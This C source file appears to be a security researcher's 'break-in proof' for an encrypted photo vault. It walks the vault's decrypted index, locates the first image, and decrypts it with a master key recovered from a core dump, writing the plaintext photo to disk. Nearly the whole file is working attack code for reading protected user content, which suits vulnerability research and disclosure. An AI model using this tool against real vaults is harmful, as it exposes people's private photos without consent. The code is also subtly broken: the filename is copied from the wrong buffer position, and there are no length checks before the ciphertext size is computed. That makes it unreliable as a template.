// Break-in proof (Phase 1): parse the decrypted index blob, find the first
// image's data chunk, decrypt it with the core-recovered master key, and write
// the plaintext photo out. Proves the recovered key can read arbitrary vault
// content (not just the index).
//
// Usage: extract_photo <vault> <key_hex_64chars> <indexblob> [out]
//   out defaults to "./photo_decrypted.bin".
//
// Builds against the vendored Monocypher — see the Makefile in this directory.
#define _POSIX_C_SOURCE 200809L // fseeko / off_t (64-bit file offsets)
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <monocypher.h>

typedef struct { const uint8_t *p; size_t n, i; int ok; } R;
static uint8_t  ru8 (R*r){ if(r->i+1>r->n){r->ok=0;return 0;} return r->p[r->i++]; }
static uint16_t ru16(R*r){ if(r->i+2>r->n){r->ok=0;return 0;} uint16_t v=(uint16_t)(r->p[r->i]|(r->p[r->i+1]<<8)); r->i+=2; return v; }
static uint32_t ru32(R*r){ if(r->i+4>r->n){r->ok=0;return 0;} uint32_t v=0; for(int k=3;k>=0;k--)v=(v<<8)|r->p[r->i+k]; r->i+=4; return v; }
static uint64_t ru64(R*r){ if(r->i+8>r->n){r->ok=0;return 0;} uint64_t v=0; for(int k=7;k>=0;k--)v=(v<<8)|r->p[r->i+k]; r->i+=8; return v; }
static void skip(R*r,size_t k){ if(r->i+k>r->n){r->ok=0;} else r->i+=k; }

static int found=0; static char fname[512]; static uint64_t fo=0, fl=0;

static void walk(R*r, uint8_t ver, int depth){
    if(depth>128||found) return;
    uint8_t type=ru8(r); if(!r->ok) return;
    uint16_t nl=ru16(r); char tmp[512]; if(nl>511)nl=511; if(r->ok){ memcpy(tmp,r->p,nl); tmp[nl]=0; } else tmp[0]=0; skip(r,nl);
    uint16_t tc=ru16(r); for(uint16_t i=0;i<tc;i++){ uint16_t tl=ru16(r); skip(r,tl); }
    ru8(r); // favorite
    if(ver>=6) ru8(r); // sort_key
    if(type==0){ // gallery
        uint32_t cc=ru32(r); for(uint32_t i=0;i<cc && r->ok;i++) walk(r,ver,depth+1);
    } else if(type==1){ // image
        ru8(r); uint32_t w=ru32(r); uint32_t h=ru32(r); uint64_t os=ru64(r); ru64(r); // timestamp (skipped)
        uint64_t doff=ru64(r); uint64_t dlen=ru64(r); uint64_t toff=ru64(r); uint64_t tlen=ru64(r);
        if(ver>=7) ru8(r);
        if(dlen>0 && !found){ found=1; snprintf(fname,sizeof fname,"%s",tmp); fo=doff; fl=dlen;
            printf("FIRST IMAGE: name=%s  %ux%u  orig_size=%llu  data_offset=%llu data_length=%llu (thumb %llu/%llu)\n",
                tmp,w,h,(unsigned long long)os,(unsigned long long)doff,(unsigned long long)dlen,(unsigned long long)toff,(unsigned long long)tlen); }
    } else if(type==2){ // video
        ru8(r);ru8(r);ru32(r);ru32(r);ru64(r);ru64(r);ru64(r);ru32(r); // container size (skipped)
        uint32_t n=ru32(r);
        for(uint32_t i=0;i<n;i++){ru64(r);ru64(r);} ru64(r);ru64(r);
    }
}

static int parse_key_hex(const char *s, uint8_t key[32])
{
    int nib=0;
    for(const char *c=s; *c && nib<64; ++c){
        int hi;
        if(*c>='0'&&*c<='9') hi=*c-'0';
        else if(*c>='a'&&*c<='f') hi=*c-'a'+10;
        else if(*c>='A'&&*c<='F') hi=*c-'A'+10;
        else continue;
        if((nib&1)==0) key[nib/2]=(uint8_t)(hi<<4); else key[nib/2]|=(uint8_t)hi;
        nib++;
    }
    return nib;
}

int main(int argc,char**argv){
    if(argc<4){fprintf(stderr,"usage: %s <vault> <keyhex> <indexblob> [out]\n",argv[0]);return 2;}
    const char *out = (argc>4) ? argv[4] : "./photo_decrypted.bin";
    uint8_t key[32];
    if(parse_key_hex(argv[2],key)!=64) return 2;

    FILE*ib=fopen(argv[3],"rb"); if(!ib)return 1; fseek(ib,0,SEEK_END); long sz=ftell(ib); fseek(ib,0,SEEK_SET);
    uint8_t*idx=malloc(sz); if(fread(idx,1,sz,ib)!=(size_t)sz)return 1; fclose(ib);
    R r={idx,(size_t)sz,0,1}; r.i=1; // skip version byte
    uint8_t ver=idx[0];
    walk(&r,ver,0);
    if(!found){fprintf(stderr,"no image found\n");return 1;}

    // Now decrypt the data chunk from the vault: chunk = nonce[24] | cipher | tag[16]
    FILE*f=fopen(argv[1],"rb"); if(!f)return 1;
    uint8_t*data=malloc(fl); fseeko(f,(off_t)fo,SEEK_SET);
    if(fread(data,1,fl,f)!=(size_t)fl){fprintf(stderr,"short chunk read\n");return 1;} fclose(f);
    const uint8_t*nonce=data; const uint8_t*tag=data+fl-16; const uint8_t*cipher=data+24; size_t clen=fl-24-16;
    uint8_t*plain=malloc(clen);
    int rc=crypto_aead_unlock(plain,tag,key,nonce,NULL,0,cipher,clen);
    printf("image chunk: crypto_aead_unlock -> %s  (plaintext %zu bytes)\n", rc==0?"TAG VERIFIED (success)":"AUTH FAILED", clen);
    if(rc==0){ FILE*o=fopen(out,"wb"); if(o){fwrite(plain,1,clen,o);fclose(o);}
        printf("wrote %s (%zu bytes)\n", out, clen);
        printf("magic: %02x %02x %02x %02x\n",plain[0],plain[1],plain[2],plain[3]); }
    return rc==0?0:1;
}
